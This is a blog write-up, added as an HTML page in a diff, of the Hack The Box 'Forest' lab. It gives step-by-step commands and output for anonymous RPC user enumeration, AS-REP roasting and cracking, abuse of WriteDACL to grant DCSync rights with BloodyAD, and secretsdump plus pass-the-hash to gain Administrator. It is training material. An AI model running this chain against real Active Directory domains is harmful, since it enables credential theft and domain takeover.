@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>Hack The Box: Forest · blackhawk0x</title>
+  <meta name="description" content="Hack The Box Forest — Write-Up
+
+">
+  <link rel="icon" href="data:,">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="blackhawk0x" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hack The Box: Forest | blackhawk0x</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Hack The Box: Forest" />
+<meta name="author" content="blackhawk0x" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hack The Box Forest — Write-Up" />
+<meta property="og:description" content="Hack The Box Forest — Write-Up" />
+<link rel="canonical" href="http://localhost:4000/posts/forest/" />
+<meta property="og:url" content="http://localhost:4000/posts/forest/" />
+<meta property="og:site_name" content="blackhawk0x" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-10-21T00:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box: Forest" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"blackhawk0x"},"dateModified":"2026-10-21T00:00:00+05:30","datePublished":"2026-10-21T00:00:00+05:30","description":"Hack The Box Forest — Write-Up","headline":"Hack The Box: Forest","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/forest/"},"url":"http://localhost:4000/posts/forest/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <header class="site-head">
+    <div class="site-head__inner shell">
+      <a href="/" class="wordmark">blackhawk<span class="dot">0x</span></a>
+      <nav class="nav">
+        <a href="/tags/" class="nav__link">topics</a>
+        <a href="/about/" class="nav__link">about</a>
+        <a href="/feed.xml" class="nav__link">rss</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="shell">
+    <article>
+  <header class="post-head">
+    <h1 class="post-title">Hack The Box: Forest</h1>
+    <p class="post-meta">
+      2026.10.21
+      
+        &nbsp;·&nbsp;
+        <a class="row__tag" href="/tags/#as-rep-roasting">as-rep-roasting</a>, <a class="row__tag" href="/tags/#bloodhound">bloodhound</a>, <a class="row__tag" href="/tags/#dcsync">dcsync</a>
+      
+    </p>
+  </header>
+  <div class="post-content">
+    <h1 id="hack-the-box-forest--write-up">Hack The Box Forest — Write-Up</h1>
+
+<h2 id="overview">Overview</h2>
+
+<p><strong>Target:</strong> Forest<br />
+<strong>Domain:</strong> <code class="language-plaintext highlighter-rouge">htb.local</code><br />
+<strong>Domain Controller:</strong> <code class="language-plaintext highlighter-rouge">FOREST.htb.local</code> (<code class="language-plaintext highlighter-rouge">10.129.95.210</code>)<br />
+<strong>Operating System:</strong> Windows Server 2016 Standard<br />
+<strong>Initial Access:</strong> AS-REP roasting<br />
+<strong>Privilege Escalation:</strong> Abusing delegated Active Directory permissions to obtain DCSync rights<br />
+<strong>Tools:</strong> Nmap, Kerbrute, SMBClient, rpcclient, Impacket, Hashcat, BloodHound.py, BloodyAD, Evil-WinRM</p>
+
+<hr />
+
+<h2 id="1-reconnaissance">1. Reconnaissance</h2>
+
+<p>I began by scanning the ports commonly associated with Active Directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985 10.129.95.210 <span class="nt">--min-rate</span> 1000
+  
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2026-10-21 06:28:46Z<span class="o">)</span>
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp open  tcpwrapped
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: FOREST<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST<span class="se">\x</span>00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System <span class="nb">time</span>: 2026-10-20T23:29:10-07:00
+|_clock-skew: mean: 2h26m51s, deviation: 4h02m32s, median: 6m49s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2026-10-21T06:29:06
+|_  start_date: 2026-10-21T06:26:16
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>58.78 seconds
+</code></pre></div></div>
+
+<p>The results identified a Windows Server 2016 host named <code class="language-plaintext highlighter-rouge">FOREST</code>, belonging to the <code class="language-plaintext highlighter-rouge">htb.local</code> domain. LDAP, Kerberos, SMB, the Global Catalog, and WinRM were accessible.</p>
+
+<p>The most relevant findings were:</p>
+
+<ul>
+  <li>DNS (53), Kerberos (88), LDAP (389), and Global Catalog (3268) were exposed.</li>
+  <li>SMB (445) required message signing.</li>
+  <li>WinRM (5985) was available, making it a potential route for remote access once valid credentials were found.</li>
+  <li>The host’s FQDN was <code class="language-plaintext highlighter-rouge">FOREST.htb.local</code>.</li>
+</ul>
+
+<h3 id="user-enumeration">User enumeration</h3>
+
+<p>My first Kerberos username-enumeration attempt with Kerbrute did not return useful results:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">--dc</span> 10.129.95.210 <span class="nt">--domain</span> htb.local <span class="se">\</span>
+  /opt/wordlists/statistically-likely-usernames/jsmith.txt
+</code></pre></div></div>
+
+<p>Anonymous SMB access was accepted, but listing shares did not reveal any shares:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> <span class="nt">-L</span> <span class="s1">'//10.129.95.210/'</span>
+</code></pre></div></div>
+
+<p>Anonymous RPC enumeration, however, worked. I used <code class="language-plaintext highlighter-rouge">rpcclient</code> to query domain information and enumerate domain users:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 10.129.95.210
+</code></pre></div></div>
+
+<p>At the RPC prompt:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+</code></pre></div></div>
+
+<p>Among the enumerated accounts was <code class="language-plaintext highlighter-rouge">svc-alfresco</code>, which became the focus of the next step.</p>
+
+<hr />
+
+<h2 id="2-initial-access-as-rep-roasting">2. Initial Access: AS-REP Roasting</h2>
+
+<p>I checked the enumerated usernames for accounts that did not require Kerberos pre-authentication:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers htb.local/ <span class="nt">-usersfile</span> ./users.list <span class="nt">-no-pass</span>
+</code></pre></div></div>
+
+<p>The output returned an AS-REP response for <code class="language-plaintext highlighter-rouge">svc-alfresco</code>. This indicated that the account was configured with the <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIRE_PREAUTH</code> flag, allowing an attacker to request material that could be attacked offline without first knowing the account’s password.</p>
+
+<p>I saved the returned hash and used Hashcat with the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist. Hashcat identified the format as mode <code class="language-plaintext highlighter-rouge">18200</code> (Kerberos 5 AS-REP, etype 23) and successfully cracked it.</p>
+
+<h3 id="access-over-winrm">Access over WinRM</h3>
+
+<p>With the recovered <code class="language-plaintext highlighter-rouge">svc-alfresco</code> credentials, I connected to the host using Evil-WinRM:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.129.95.210 <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span>
+</code></pre></div></div>
+
+<p>I located <code class="language-plaintext highlighter-rouge">user.txt</code> on the account’s Desktop and captured the user flag.</p>
+
+<hr />
+
+<h2 id="3-active-directory-enumeration-with-bloodhound">3. Active Directory Enumeration with BloodHound</h2>
+
+<p>After obtaining a shell, I collected Active Directory data with <code class="language-plaintext highlighter-rouge">bloodhound-python</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodhound-python <span class="nt">--username</span> svc-alfresco <span class="nt">--password</span> <span class="s1">'&lt;password&gt;'</span> <span class="se">\</span>
+  <span class="nt">-d</span> htb.local <span class="nt">-dc</span> FOREST.htb.local <span class="nt">-ns</span> 10.129.95.210 <span class="nt">-c</span> all
+</code></pre></div></div>
+
+<p>The collection retrieved domain, user, group, OU, GPO, and computer information. Some computer-related collection steps produced Kerberos errors, including clock skew, but the tool still collected substantial directory data.</p>
+
+<p>I then examined the BloodHound relationships for <code class="language-plaintext highlighter-rouge">svc-alfresco</code>.</p>
+
+<p>Two relationships stood out:</p>
+
+<ol>
+  <li>The account could add itself to <strong>Exchange Windows Permissions</strong>.</li>
+</ol>
+
+<p><img src="/assets/images/forest_svc_outbound_privelge.png" alt="BloodHound showing the service account's outbound privilege relationship" /></p>
+
+<ol>
+  <li>That group had <code class="language-plaintext highlighter-rouge">WriteDACL</code> over the domain root object.</li>
+</ol>
+
+<p><img src="/assets/images/exchange_windows_group_privilege.png" alt="BloodHound showing Exchange Windows Permissions and WriteDACL over the domain" /></p>
+
+<p>The domain root was:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DC=HTB,DC=LOCAL
+</code></pre></div></div>
+
+<p>This was the pivotal finding. <code class="language-plaintext highlighter-rouge">WriteDACL</code> does not itself mean “Domain Admin”; it permits modification of an object’s discretionary access control list. When the target is the domain root, that ability can be used to grant additional directory permissions—including the replication rights required for DCSync.</p>
+
+<hr />
+
+<h2 id="4-privilege-escalation-group-membership-and-dcsync">4. Privilege Escalation: Group Membership and DCSync</h2>
+
+<h3 id="step-1-add-svc-alfresco-to-exchange-windows-permissions">Step 1: Add <code class="language-plaintext highlighter-rouge">svc-alfresco</code> to Exchange Windows Permissions</h3>
+
+<p>I used BloodyAD to add the account to the group identified in BloodHound:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyad <span class="nt">-H</span> htb.local <span class="nt">--username</span> svc-alfresco <span class="nt">--password</span> <span class="s1">'&lt;password&gt;'</span> <span class="se">\</span>
+  add groupMember <span class="s1">'EXCHANGE WINDOWS PERMISSIONS'</span> svc-alfresco
+</code></pre></div></div>
+
+<p>BloodyAD confirmed that the membership change succeeded.</p>
+
+<p>This step relied on the account’s effective permissions over group membership. It was not a consequence of AS-REP roasting itself; the two findings formed separate stages of the attack chain.</p>
+
+<h3 id="step-2-grant-dcsync-rights">Step 2: Grant DCSync rights</h3>
+
+<p>With the new group membership, I used BloodyAD to grant DCSync capability to <code class="language-plaintext highlighter-rouge">svc-alfresco</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyad <span class="nt">-H</span> htb.local <span class="nt">--username</span> svc-alfresco <span class="nt">--password</span> <span class="s1">'&lt;password&gt;'</span> <span class="se">\</span>
+  add dcsync <span class="s1">'svc-alfresco'</span>
+</code></pre></div></div>
+
+<p>BloodyAD reported:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] svc-alfresco is now able to DCSync
+</code></pre></div></div>
+
+<p>DCSync abuses Active Directory’s directory-replication mechanisms. A principal with the necessary replication extended rights can request directory secret data from a domain controller. The relevant rights include <strong>Replicating Directory Changes</strong> and <strong>Replicating Directory Changes All</strong>.</p>
+
+<hr />
+
+<h2 id="5-credential-access-dcsync">5. Credential Access: DCSync</h2>
+
+<p>I then used Impacket’s <code class="language-plaintext highlighter-rouge">secretsdump</code> to request domain credential material:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump htb.local/svc-alfresco:<span class="s1">'&lt;password&gt;'</span>@10.129.95.210
+</code></pre></div></div>
+
+<p>The output included this warning:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::
+</code></pre></div></div>
+
+<p>However, the tool continued with the DRSUAPI method and successfully returned the <code class="language-plaintext highlighter-rouge">HTB\Administrator</code> account’s NTLM hash.</p>
+
+<hr />
+
+<h2 id="6-administrator-access-and-root-flag">6. Administrator Access and Root Flag</h2>
+
+<p>With the Administrator NTLM hash, I connected using Evil-WinRM’s hash-authentication option:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.129.95.210 <span class="nt">-u</span> administrator <span class="nt">-H</span> <span class="s1">'&lt;NTLM-hash&gt;'</span>
+</code></pre></div></div>
+
+<p>The login succeeded. I navigated to the Administrator profile’s Desktop and retrieved <code class="language-plaintext highlighter-rouge">root.txt</code>, completing the machine.</p>
+
+<hr />
+
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Anonymous RPC enumeration
+        ↓
+Identify svc-alfresco
+        ↓
+AS-REP roast the account
+        ↓
+Crack the hash offline
+        ↓
+WinRM access as svc-alfresco
+        ↓
+BloodHound reveals delegated permissions
+        ↓
+Add svc-alfresco to Exchange Windows Permissions
+        ↓
+Abuse WriteDACL on the domain root
+        ↓
+Grant DCSync rights to svc-alfresco
+        ↓
+Retrieve the Administrator NTLM hash
+        ↓
+WinRM as Administrator
+        ↓
+Root flag
+</code></pre></div></div>
+
+  </div>
+</article>
+
+  </main>
+
+  <footer class="foot">
+    <div class="foot__inner shell">
+      <div class="foot__bar">
+        <p class="foot__id">
+          <span class="foot__brand">blackhawk0x</span>
+          <span class="foot__role">Ctf player</span>
+        </p>
+        <div class="foot__navs">
+          <nav class="foot__group" aria-label="site">
+            <a class="foot__link" href="/">writeups</a>
+            <span class="foot__dot">·</span><a class="foot__link" href="/tags/">topics</a>
+            <span class="foot__dot">·</span><a class="foot__link" href="/about/">about</a>
+          </nav>
+          <nav class="foot__group" aria-label="elsewhere">
+            <a class="foot__link" href="https://github.com/blackhawk0x" rel="me noopener">github</a>
+            
+            <span class="foot__dot">·</span><a class="foot__link" href="mailto:your_email@example.com">email</a>
+          </nav>
+          <nav class="foot__group" aria-label="machine readable">
+            <a class="foot__link" href="/feed.xml">rss</a>
+            <span class="foot__dot">·</span><a class="foot__link" href="/sitemap.xml">sitemap</a>
+          </nav>
+        </div>
+      </div>
+      <p class="foot__colophon">
+        <span>&copy; 2026 blackhawk0x</span>
+        <span class="foot__dot">·</span>
+        <span>no tracker</span>
+      </p>
+    </div>
+  </footer>
+</body>
+</html>
